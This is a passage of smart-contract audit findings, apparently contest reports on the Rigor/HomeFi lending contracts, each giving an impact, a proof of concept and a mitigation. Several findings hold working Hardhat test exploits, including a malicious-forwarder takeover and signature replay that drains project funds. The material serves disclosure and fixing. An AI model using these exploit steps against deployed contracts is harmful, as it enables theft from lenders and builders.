expect(decodedAction[3]).to.be.equal(projectAddress);       // expect unchanged number of tasks       let taskCount = await project.taskCount();       expect(taskCount).to.be.equal(expected);     });  ```  ## Recommended Mitigation Steps Make `raiseDispute()` to check for approvedHashes too
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L710   # Vulnerability details  ## Impact  In `Project` contract, the `lendToProject()` function might not be available to be called if there are a lot of Task in `tasks[]` list of project. It means that the project cannot be funded by either builder or community owner.  This can happen because `lendToProject()` used `projectCost()` function. And the loop in `projectCost()` did not have a mechanism to stop, itâ€™s only based on the length `taskCount`, and may take all the gas limit. If the gas limit is reached, this transaction will fail or revert.  Same issue with `toggleLendingNeeded()` function which also call `projectCost()` function.  ## Proof of Concept  Function `projectCost()` did not have a mechanism to stop, only based on the `taskCount`. ```solidity function projectCost() public view override returns (uint256 _cost) {     // Local instance of taskCount. To save gas.     uint256 _length = taskCount;      // Iterate over all tasks to sum their cost     for (uint256 _taskID = 1; _taskID <= _length; _taskID++) {         _cost += tasks[_taskID].cost;     } } ```  There is no limit for builder when [add task](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L248-L257).  And function `lendToProject()` used `projectCost()` to [check the new total lent value](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L199-L202) ```solidity require(     projectCost() >= uint256(_newTotalLent),     "Project::value>required" ); ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Consider keep value of `projectCost()` in a storage variable and update it when a task is added or updated accordingly.  
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L498-L502 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/SignatureDecoder.sol#L25   # Vulnerability details  ## Impact  Disputes enable an actor to arbitrate & potentially enforce requested state changes. However, the current implementation does not properly implement authorization, thus anyone is able to create disputes and spam the system with invalid disputes.  ## Proof of Concept  Calling the `Project.raiseDispute` function with an invalid `_signature`, for instance providing a `_signature` with a length of 66 will return `address(0)` as the recovered signer address.  [Project.raiseDispute](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L498-L502)  ```solidity function raiseDispute(bytes calldata _data, bytes calldata _signature)     external     override {     // Recover the signer from the signature     address signer = SignatureDecoder.recoverKey(         keccak256(_data),         _signature,         0     );      ...   } ```  [SignatureDecoder.sol#L25](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/SignatureDecoder.sol#L25)  ```solidity function recoverKey(   bytes32 messageHash,   bytes memory messageSignatures,   uint256 pos ) internal pure returns (address) {   if (messageSignatures.length % 65 != 0) {       return (address(0));   }    ... } ```  If `_task` is set to `0` and the project does not have a `contractor`, the `require` checks will pass and `IDisputes(disputes).raiseDispute(_data, _signature);` is called. The same applies if a specific `_task` is given and if the task has a `subcontractor`. Then the check will also pass.  [Project.raiseDispute](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Disputes.sol#L84-L122)  ```solidity function raiseDispute(bytes calldata _data, bytes calldata _signature)     external     override {     // Recover the signer from the signature     address signer = SignatureDecoder.recoverKey(         keccak256(_data),         _signature,         0     );      // Decode params from _data     (address _project, uint256 _task, , , ) = abi.decode(         _data,         (address, uint256, uint8, bytes, bytes)     );      // Revert if decoded project address does not match this contract. Indicating incorrect _data.     require(_project == address(this), "Project::!projectAddress");      if (_task == 0) {         // Revet if sender is not builder or contractor         require(             signer == builder || signer == contractor, // @audit-info if `contractor = address(0)` and the recovered signer is also the zero-address, this check will pass             "Project::!(GC||Builder)"         );     } else {         // Revet if sender is not builder, contractor or task's subcontractor         require(             signer == builder ||                 signer == contractor || // @audit-info if `contractor = address(0)` and the recovered signer is also the zero-address, this check will pass                 signer == tasks[_task].subcontractor,             "Project::!(GC||Builder||SC)"         );          if (signer == tasks[_task].subcontractor) {             // If sender is task's subcontractor, revert if invitation is not accepted.             require(getAlerts(_task)[2], "Project::!SCConfirmed");         }     }      // Make a call to Disputes contract raiseDisputes.     IDisputes(disputes).raiseDispute(_data, _signature); // @audit-info Dispute will be created. Anyone can spam the system with fake disputes } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider checking the recovered `signer` address in `Project.raiseDispute` to not equal the zero-address:  ```solidity function raiseDispute(bytes calldata _data, bytes calldata _signature)     external     override {     // Recover the signer from the signature     address signer = SignatureDecoder.recoverKey(         keccak256(_data),         _signature,         0     );      require(signer != address(0), "Zero-address"); // @audit-info Revert if signer is zero-address      ...   } ``` 
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Community.sol#L187 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Community.sol#L179 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Community.sol#L878 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/libraries/SignatureDecoder.sol#L39   # Vulnerability details  ## Impact There is a `addMember` function in the `Community`.  The function accepts `_data` that should be signed by the `_community.owner` and `_newMemberAddr`.   ```         // Compute hash from bytes         bytes32 _hash = keccak256(_data);          // Decode params from _data         (             uint256 _communityID,             address _newMemberAddr,             bytes memory _messageHash         ) = abi.decode(_data, (uint256, address, bytes));          CommunityStruct storage _community = _communities[_communityID];          // check signatures         checkSignatureValidity(_community.owner, _hash, _signature, 0); // must be community owner         checkSignatureValidity(_newMemberAddr, _hash, _signature, 1); // must be new member ```  The code above shows exactly what the contract logic looks like.   1) `_communityID` is taken from the data provided by user, so it can arbitrarily. Specifically,  community with selected `_communityID` can be not yet created. For instance, it can be equal to the `communityCount + 1`, thus the next created community will have this `_communityID`.   2) `_communities[_communityID]` will store null values for all fields, for a selected `_communityID`. That means, `_community.owner == address(0)`  3) `checkSignatureValidity` with a parameters `address(0), _hash, _signature, 0` will not revert a call if an attacker provide incorrect `_signature`.  let's see the implementation of `checkSignatureValidity`:  ```         // Decode signer         address _recoveredSignature = SignatureDecoder.recoverKey(             _hash,             _signature,             _signatureIndex         );          // Revert if decoded signer does not match expected address         // Or if hash is not approved by the expected address.         require(             _recoveredSignature == _address || approvedHashes[_address][_hash],             "Community::invalid signature"         );          // Delete from approvedHash. So that signature cannot be reused.         delete approvedHashes[_address][_hash]; ```  No restrictions on `_recoveredSignature` or `_address`. Moreover, if `SignatureDecoder.recoverKey` can return zero value, then there will be no revert.   ```        if (messageSignatures.length % 65 != 0) {             return (address(0));         }          uint8 v;         bytes32 r;         bytes32 s;         (v, r, s) = signatureSplit(messageSignatures, pos);          // If the version is correct return the signer address         if (v != 27 && v != 28) {             return (address(0));         } else {             // solium-disable-next-line arg-overflow             return ecrecover(toEthSignedMessageHash(messageHash), v, r, s);         } ```  As we can see bellow, `recoverKey` function can return zero value, if an `ecrecover` return zero value or if `v != 27 || v != 28`. Both cases are completely dependent on the input parameters to the function, namely from `signature` that is provided by attacker.  4) `checkSignatureValidity(_newMemberAddr, _hash, _signature, 1)` will not revert the call if an attacker provide correct signature in the function. It is obviously possible.  All in all, an attacker can add as many members as they want, BEFORE the `community` will be created.   ## Tools Used  ## Recommended Mitigation Steps   1) `checkSignatureValidity`/`recoverKey` should revert the call if an `address == 0`. 2) `addMember` should have a `require(_communityId <= communityCount)`  
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L156-L169 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L199-L208   # Vulnerability details   ## Impact In case where the admin wallet has been hacked, the attacker can drain all funds out of the project within minutes. All the attacker needs is the admin to sign a single meta/normal tx. Even though the likelihood of the admin wallet being hacked might be low, given that the impact is critical - I think this makes it at least a medium bug.   Examples of cases where the attacker can gain access to admin wallet: * The computer which the admins are using has been hacked     * Even if a hardware wallet is used, the attacker can still replace the data sent to the wallet the next time the admin has to sign a tx (whether it's a meta or normal tx) * The website/software where the meta tx data is generated has been hacked and attacker modifies the data for tx * A malicious website tricks the admin into signing a meta tx to replace the admin or forwarder     Since the forwarder has the power to do everything in the system , once an attacker manages to replace it with a malicious forwarder, he can do whatever he wants withing minutes: * The forwarder can replace the admin * The forwarder can drain all funds from all projects by changing the subcontractor and marking tasks as complete, or adding new tasks / changing task cost as needed.  Even when signatures are required, you can bypass it by using the `approveHash` function.  ## Proof of Concept Here's a PoC for taking over and running the `Project.setComplete()` function (I haven't included a whole process of changing SC etc. since that would be too time consuming, but there shouldn't be a difference between functions, all can be impersonated once you control the forwarder).  The PoC was added to [projectTests.ts#L1109](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/test/utils/projectTests.ts#L1109), and is based on the 'should be able to complete a task' test.  ```typescript     it('PoC forwarder overtake', async () => {     const attacker = signers[10];       // deploy the malicious forwarder     const maliciousForwarder = await deploy<MaliciousForwarder>('MaliciousForwarder');     const adminAddress = await homeFiContract.admin();     const adminSigner = getSignerByAddress(signers, adminAddress);     // attacker takes over     await homeFiContract.connect(adminSigner).setTrustedForwarder(maliciousForwarder.address);            // attacker can now replace the admin, so that admin can't set the forwarder back     let { data } = await homeFiContract.populateTransaction.replaceAdmin(       attacker.address     );     let from = adminAddress;     let to = homeFiContract.address;     if (!data) {       throw Error('No data');     }     let tx = await executeMetaTX(from, to, data);      // assert that admin has been replaced by attacker     expect(await homeFiContract.admin()).to.be.eq(attacker.address);      // attacker can now execute setComplete() using the approveHash() method      const taskID = 1;     const _taskCost = 2 * taskCost;     const taskSC = signers[3];     let completeData = {       types: ['uint256', 'address'],       values: [taskID, project.address],     };     const [encodedData, hash] = await encodeDataAndHash(completeData);     await mockDAIContract.mock.transfer       .withArgs(taskSC.address, _taskCost)       .returns(true);     await mockDAIContract.mock.transfer       .withArgs(await homeFiContract.treasury(), _taskCost / 1e3)       .returns(true);      ({data} = await project.populateTransaction.approveHash(hash));     let contractor = await project.contractor();     let {subcontractor} = await project.getTask(taskID);     let builder = await project.builder();      await executeMetaTX(contractor, project.address, data as string);     await executeMetaTX(subcontractor, project.address, data as string);     await executeMetaTX(builder, project.address, data as string);           tx = await project.setComplete(encodedData, "0x");     await tx.wait();      await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);      const { state } = await project.getTask(taskID);     expect(state).to.equal(3);     const getAlerts = await project.getAlerts(taskID);     expect(getAlerts[0]).to.equal(true);     expect(getAlerts[1]).to.equal(true);     expect(getAlerts[2]).to.equal(true);     expect(await project.lastAllocatedChangeOrderTask()).to.equal(0);     expect(await project.changeOrderedTask()).to.deep.equal([]);      async function executeMetaTX(from: string, to: string, data: string ) {       const gasLimit = await ethers.provider.estimateGas({         to,         from,         data,       });       const message = {         from,         to,         value: 0,         gas: gasLimit.toNumber(),         nonce: 0,         data,       };        // @ts-ignore       let tx = await maliciousForwarder.execute(message, "0x");       return tx;     }   });   // ----------------------------------------------------- // // Added to ethersHelpers.ts file: export function encodeDataAndHash(   data: any): string[] {   const encodedData = encodeData(data);   const encodedMsgHash = ethers.utils.keccak256(encodedData);   return [encodedData, encodedMsgHash]; } ```  ## Recommended Mitigation Steps  * Limit `approveHash` to contracts only - I understood from the sponsor that it is used for contracts to sign hashes. So limiting it to contracts only can help prevent stealing funds (from projects that are held by EOA) in case that the forwarder has been compromised (this is effective also in case there's some bug in the forwarder contract).     * Alternately, you can also make it use `msg.sender` instead of `_msgSender()`, this will also have a similar effect (it will allow also EOA to use the function, but not via forwarder).          * The advantage is that not only it wouldn't cost more than now, it'll even save gas.          * Another advantage is that it will also protect projects held by contracts from being impersonated by a malicious forwarder  * Make the process of replacing the forwarder or the admin a 2 step process with a delay between the steps (except for disabling the forwarder, in case the forwarder was hacked). This will give the admin the option to take steps to stop the attack, or at least give the users time to withdraw their money.   ```solidity     /// @inheritdoc IHomeFi     function replaceAdmin(address _newAdmin)         external         override         onlyAdmin         nonZero(_newAdmin)         noChange(admin, _newAdmin)     {         // Replace admin         pendingAdmin = _newAdmin;          adminReplacementTime = block.timestamp + 1 days;         emit AdminReplaceProposed(_newAdmin);     }          /// @inheritdoc IHomeFi     function executeReplaceAdmin()         external         override         onlyAdmin      {         require(adminReplacementTime > 0 && block.timestamp > adminReplacementTime, "HomeFi::adminReplacmantTime");         // Replace admin         admin = pendingAdmin;          emit AdminReplaced(_newAdmin);     }     /// @inheritdoc IHomeFi     function setTrustedForwarder(address _newForwarder)         external         override         onlyAdmin         noChange(trustedForwarder, _newForwarder)     {         // allow disabling the forwarder immediately in case it has been hacked         if(_newForwarder == address(0)){             trustedForwarder = _newForwarder;         }         forwarderSetTime = block.timestamp + 3 days;         pendingTrustedForwarder = _newForwarder;     }      function executeSetTrustedForwarder(address _newForwarder)         external         override         onlyAdmin     {         require(forwarderSetTime > 0 &&  block.timestamp > forwarderSetTime, "HomeFi::forwarderSetTime");         trustedForwarder = pendingTrustedForwarder;     }  ```  * Consider removing the meta tx for `HomeFi` `onlyAdmin` modifier (i.e. usg `msg.sender` instead of `_msgSender()`), given that it's not going to be used that often it may be worth giving up the comfort for hardening security 
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L330   # Vulnerability details  ## Impact `setComplete()` function might be called successfully using the past signature when it shouldn't work.  As a result, a task might be completed when a builder doesn't want it.   ## Proof of Concept [approveHash() function](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L108) can set only true so there is no method to cancel already approved hash without [passing validation here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L891).  So the below scenario would be possible.  - A builder, GC, and SC started a task and SC finished the task. - They are approved to complete the task and signed the signature. - But right before to call [setComplete()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L330) using the signature, the SC felt the cost is too low and raised a dispute to change the order using [raiseDispute()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L493). - As I suggested with another medium issue, the task can't be completed when there is an ongoing dispute from [this document - "If there is no ongoing dispute about that project, task status is updated and payment is made."](https://github.com/code-423n4/2022-08-rigor#tasks-completion-and-payment). So `setComplete()` might revert. - Even if it doesn't check active disputes as now, `setComplete()` might revert when the funds haven't been allocated and a builder signed by fault. - After that, the HomeFi admin accepted the dispute, and the cost of the task was increased as SC wanted. - Then the builder would hope to get more results (or scores) from this task as the cost is increased rather than completed right away. - But SC can call `setComplete()` using the previous signature and complete the task without additional work. - A builder might know about that before and try to update task hash but it will revert because SC doesn't agree to [updateTaskHash()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L283). - In this case, it's logical to cancel the approved hash [here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L108) but there is no such option.   I don't know if there would be similar problems with other functions that use signature and I think it would reduce the risk a little if we add an option to cancel the approved hash.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps Recommend modifying [approveHash()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L108) like below.  ``` function approveHash(bytes32 _hash, bool _bool) external override { //++++++++++++++++++++     address _sender = _msgSender();     // Allowing anyone to sign, as its hard to add restrictions here.     // Store _hash as signed for sender.     approvedHashes[_sender][_hash] = _bool; //+++++++++++++++++++      emit ApproveHash(_hash, _sender, _bool); //++++++++++++++++++++++ } ```  I am not so sure that a similar scenario would be possible in the [Community contract](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L501) also and recommend to change both functions together.
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L903 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L253 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L417   # Vulnerability details  ## Impact The task of zero cost is useless and there would be no subcontractors to accept such task as no payment after finish.  So if such task is added by mistake, it would require more time and effort to finish because builder must complete it by himself to recover tokens.   ## Proof of Concept It will work properly when _amount = 0.  ``` function checkPrecision(uint256 _amount) internal pure {      // Divide and multiply amount with 1000 should be equal to amount.     // This ensures the amount is not too precise.     require(         ((_amount / 1000) * 1000) == _amount,         "Project::Precision>=1000"     ); } ```  ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps Recommend changing like below.   ``` function checkPrecision(uint256 _amount) internal pure {      require(_amount > 0, "zero amount");      // Divide and multiply amount with 1000 should be equal to amount.     // This ensures the amount is not too precise.     require(         ((_amount / 1000) * 1000) == _amount,         "Project::Precision>=1000"     ); } ```
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238   # Vulnerability details  ## Impact `addTasks()` function checks [this require()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238) to make sure `_taskCount` is correct.  But it might revert when this function is called after a dispute because it takes a certain time to resolve disputes and other tasks might be added meanwhile.   ## Proof of Concept The below scenario would be possible.  - A project contains 10 active tasks(taskCount = 10) and a builder and contractor are going to add one more task. - There were some disagreements between a builder and contractor so they raised a dispute with _taskCount = 10 using [raiseDispute()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L493). - Normally it would take a certain time(like 1 day or more) to resolve the dispute as it must be done by HomeFi owner. - Meanwhile, if the builder and contractor need to add another task, they should set `_taskCount = 10` and `taskCount` will be 11 after addition [here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L260). - After that, the HomeFi admin agreed to add a task with `_taskCount = 10`, but it will revert [here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238).  So currently, the project builder and contractor shouldn't add new tasks to make their previous dispute valid.  I think it's reasonable to modify that they can add other tasks even though there is an active dispute.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps I think we can modify not to compare [taskCount](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238) when it's called from disputes contract.  So we can modify [this part](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238) like below.   ``` if (_msgSender() != disputes) {     require(_taskCount == taskCount, "Project::!taskCount"); } else {     _taskCount = taskCount; } ```
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L685-L686   # Vulnerability details  ## Impact Due to arithmetic rounding in `returnToLender()`, a builder can halve the APR paid to a community owner by paying every 1.9999 days. This allows a builder to drastically decrease the amount of interest paid to a community owner, which in turn allows them to advertise very high APR rates to secure funding, most of which they will not pay.  This issue occurs in the calculation of `noOfDays` in `returnToLender()` which calculates the number of days since interest has last been calculated. If a builder repays a very small amount of tokens every 1.9999 days, then the `noOfDays` will be rounded down to `1 days` however `lastTimestamp` is updated to the current timestamp anyway, so the builder essentially accumulates only 1 day of interest after 2 days.  I believe this is high severity because a community owner can have a drastic decrease in interest gained from a loan which counts as lost rewards. Additionally, this problem does not require a malicious builder because if a builder pays at a wrong time, the loaner receives less interest anyway.  ## Proof of Concept 1. A community owner provides a loan of 500_000 tokens to a builder with an APR of 10% (ignoring treasury fees) 2. Therefore, the community owner will expect an interest of 136.9 tokens per day (273.9 per 2 days) 3. A builder repays 0.000001 tokens at `lastTimestamp + 2*86400 - 1` 4. `noOfDays` rounds down to 1 thereby accumulating `500_000 * 100 * 1 / 365000 = 136` tokens for 2 days 5. Therefore, the community owner only receives 5% APR with negligible expenses for the builder ## Tools Used VS Code ## Recommended Mitigation Steps There are two possible mitigations: 1. Add a scalar to `noOfDays` so that any rounding which occurs is negligible i.e. ```solidity         uint256 _noOfDays = (block.timestamp -             _communityProject.lastTimestamp) * SCALAR / 86400; // 24*60*60           /// Interest formula = (principal * APR * days) / (365 * 1000)         // prettier-ignore         uint256 _unclaimedInterest =                  _lentAmount *                 _communities[_communityID].projectDetails[_project].apr *                 _noOfDays /                 365000 /                 SCALAR; ``` 2. Remove the `noOfDays` calculation and calculate interest in one equation which reduces arithmetic rounding ```solidity uint256 _unclaimedInterest =                  _lentAmount *                 _communities[_communityID].projectDetails[_project].apr *                 (block.timestamp -             _communityProject.lastTimestamp) /                 365000 /                 86400; ``` 
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Project.sol#L887 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Project.sol#L108-L115   # Vulnerability details  ## Impact It is possible to pass Signature Validity check with an SignatureDecoder.recoverKey() returns 0 whenever the builder and /or contractor have an existing approved hash for a data.  With occurrence of above, any user can call changeOrder or setComplete functions successfully after  user approves data hashes.   ## Tools Used Manual review  ## Recommended Mitigation Steps There should be a require check for `_recoveredSignature != 0` in checkSignatureValidity()
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L509   # Vulnerability details  ## Impact  Since there is no nonce in the data decoded at the beginning of function `escrow`, a builder can call the function multiple times reducing their debt as much as they wish.  ## Proof of Concept  - A builder has a debt of $50,000 - A lender, a builder, and an escrow agent all ~~enter a bar~~ sign a message that will reduce the debt of the builder by $5,000, upon receipt of physical cash. - Function `escrow` is called and debt is reduced to $45,000. - The builder, using the same `_data` and `_signature` then calls `escrow` a further 9 times reducing their debt to zero.  ## Recommended Mitigation Steps  1. Similar to function `publishProject`, add a new field into the [ProjectDetails](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/interfaces/ICommunity.sol#L19-L32) struct called `escrowNonce`.  2. Modify function `escrow` to check this nonce and update it after the debt has been reduced.  See the diff below for full changes.  ```diff diff --git a/contracts/Community.sol b/contracts/Community.sol index 1585670..b834d0e 100644 --- a/contracts/Community.sol +++ b/contracts/Community.sol @@ -15,7 +15,7 @@ import {SignatureDecoder} from "./libraries/SignatureDecoder.sol";   /**   * @title Community Contract for HomeFi v2.5.0 - +   * @notice Module for coordinating lending groups on HomeFi protocol   */  contract Community is @@ -520,10 +520,11 @@ contract Community is              address _agent,              address _project,              uint256 _repayAmount, +            uint256 _escrowNonce,              bytes memory _details          ) = abi.decode(                  _data, -                (uint256, address, address, address, address, uint256, bytes) +                (uint256, address, address, address, address, uint256, uint256, bytes)              );           // Compute hash from bytes @@ -540,6 +541,12 @@ contract Community is              _lender == _communities[_communityID].owner,              "Community::!Owner"          ); +        ProjectDetails storage _communityProject = +          _communities[_communityID].projectDetails[_project]; +        require( +            _escrowNonce == _communityProject.escrowNonce, +            "Community::invalid escrowNonce" +        );           // check signatures          checkSignatureValidity(_lender, _hash, _signature, 0); // must be lender @@ -548,6 +555,7 @@ contract Community is           // Internal call to reduce debt          _reduceDebt(_communityID, _project, _repayAmount, _details); +        _communityProject.escrowNonce = _communityProject.escrowNonce + 1;          emit DebtReducedByEscrow(_agent);      }  diff --git a/contracts/interfaces/ICommunity.sol b/contracts/interfaces/ICommunity.sol index c45bbf0..652f51c 100644 --- a/contracts/interfaces/ICommunity.sol +++ b/contracts/interfaces/ICommunity.sol @@ -29,6 +29,7 @@ interface ICommunity {          uint256 lentAmount; // current principal lent to project (needs to be repaid by project's builder)          uint256 interest; // total accrued interest on `lentAmount`          uint256 lastTimestamp; // timestamp when last lending / repayment was made +        uint256 escrowNonce; // signing nonce to use when reducing debt by escrow      } ```
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L386-L490 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L330-L359 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/Tasks.sol#L153-L164   # Vulnerability details   This attack path is the results of signatures reusing in 2 functions - `changeOrder()` and `setComplete()`, and a missing modifier at `Tasks.unApprove()` library function.  ## Impact  ### Draining the project from funds  Current or previous subcontractor of a task can drain the project out of its funds by running `setComplete()` multiple times.  This can be exploited in 3 scenarios: * The price of a task was changed to a price higher than available funds (i.e. `totalLent - _totalAllocated`, and therefore gets unapproved), and than changed back to the original price (or any price that's not higher than available funds) * The subcontractor for a task was changed via `changeOrder` and then changed back to the original subcontractor      * e.g. - Bob was the original SC, it was changed to Alice, and then back to Bob * Similar to the case above, but even if the current SC is different from the original SC - it can still work if the current and previous SCs are teaming up to run the attack      * e.g. Bob was the original SC, it was changed to Alice, and changed again to Eve. And now Alice and Eve are teaming up to drain funds from the project  After `setComplete()` ran once by the legitimate users (i.e. signed by contractor, SC and builder), the attackers can now run it multiple times: * Reuse signatures to run `changeOrder()` - changing SC or setting the price to higher than available funds     * The only signer that might change is the subcontractor, he's either teaming up with the attacker (scenario #3) or he was the SC when it was first called (scenario #2) * In case of price change:     * change it back to the original price via `changeOrder()`, reusing signatures     * Run `allocateFunds()` to mark it as funded again * SC runs `acceptInvite()` to mark task as active * Run `setComplete()` reusing signatures     * If SC has changed - replace his signature with the current one (current SC should be one of the attackers) * Repeat till the project runs out of funds  ### Changing tasks costs/subcontractor by external users This can also be used by external users (you don't need to be builder/GC/SC in order to run `changeOrder()`) to troll the system (This still requires the task to be changed at least twice, otherwise re-running `changeOrder()` with the same data would have no effect).  * Changing the task cost up or down, getting the SC paid a different amount than intended (if it goes unnoticed, or front-run the `setComplete()` function) * Unapproving a task by setting a different SC or a price higher than available funds     * The legitimate users can change it back, but the attacker can change it again, both sides playing around till someone gets tired :)   ## Proof of Concept  Since the tests depend on each other, the PoC tests were created by adding them to the file `test/utils/projectTests.ts`, after the function `it('should be able to complete a task'` ( [Line 1143](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/test/utils/projectTests.ts#L1143) ).  In the first test - a subcontractor is changed and then changed back. In the second scenario a price is changed to the new price (that is higher than the total available funds, and therefore is unapproved) and then back to its original price (it can actually be any price that is not higher than the available funds). In both cases I'm demonstrating how the project can be drained out of fund,   ```typescript    type DataType = {     types: string[];     values: (string | number)[];   };    it('PoC change SC', async () => {        const taskID = 1;     let taskDetails = await project.getTask(taskID);     const scBob = taskDetails.subcontractor;     const scAliceSigner = signers[4];     console.log({ scBob, alice: scAliceSigner.address });     const newCost = taskCost; // same as old     console.log(taskDetails);     // await (await project.inviteSC([taskID], [signers[2].address])).wait();      const changeToAliceData = {       types: ['uint256', 'address', 'uint256', 'address'],       values: [taskID, scAliceSigner.address, newCost, project.address],     };     const changeToAliceSignedData = await signData(changeToAliceData);      await changeSC(changeToAliceSignedData[0], changeToAliceSignedData[1]);      const changeToBobData = {       types: ['uint256', 'address', 'uint256', 'address'],       values: [taskID, scBob, newCost, project.address],     };     const changeToBobSignedData = await signData(changeToBobData);      await changeSC(changeToBobSignedData[0], changeToBobSignedData[1]);      const bobSigner = getSignerByAddress(signers, scBob);     await (await project.connect(bobSigner).acceptInviteSC([taskID])).wait();      // for some reason if you don't do this you get 'Mock on the method is not initialized' error     await mockDAIContract.mock.transfer       .withArgs(scAliceSigner.address, taskCost)       .returns(true);     await mockDAIContract.mock.transfer       .withArgs(scBob, taskCost)       .returns(true);     await mockDAIContract.mock.transfer       .withArgs(await homeFiContract.treasury(), taskCost / 1e3)       .returns(true);       const setCompleteData = {       types: ['uint256', 'address'],       values: [taskID, project.address],     };     let setCompleteSignedData = await signData(setCompleteData);     let tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);       // attack start     await changeSC(changeToAliceSignedData[0], changeToAliceSignedData[1]);      await (await project.connect(scAliceSigner).acceptInviteSC([taskID])).wait();      // the only thing that has changed is that alice became a subcontractor     // IRL Alice can simply take the old signatures and replace Bob's signature     // with her own signature     let aliceSetCompleteSignedData = await signData(setCompleteData);       tx = await project.setComplete(setCompleteSignedData[0], aliceSetCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);      await changeSC(changeToBobSignedData[0], changeToBobSignedData[1]);     await changeSC(changeToAliceSignedData[0], changeToAliceSignedData[1]);      await (await project.connect(scAliceSigner).acceptInviteSC([taskID])).wait();          tx = await project.setComplete(setCompleteSignedData[0], aliceSetCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);           async function signData(data: DataType) {       let contractor = await project.contractor();       let builder = await project.builder();       let taskDetails = await project.getTask(taskID);       let sc = taskDetails.subcontractor;       // console.log({ contractor, builder, sc })        let changeSignersAddress = [contractor, sc];       let contractorDelegated = await project.contractorDelegated();       if 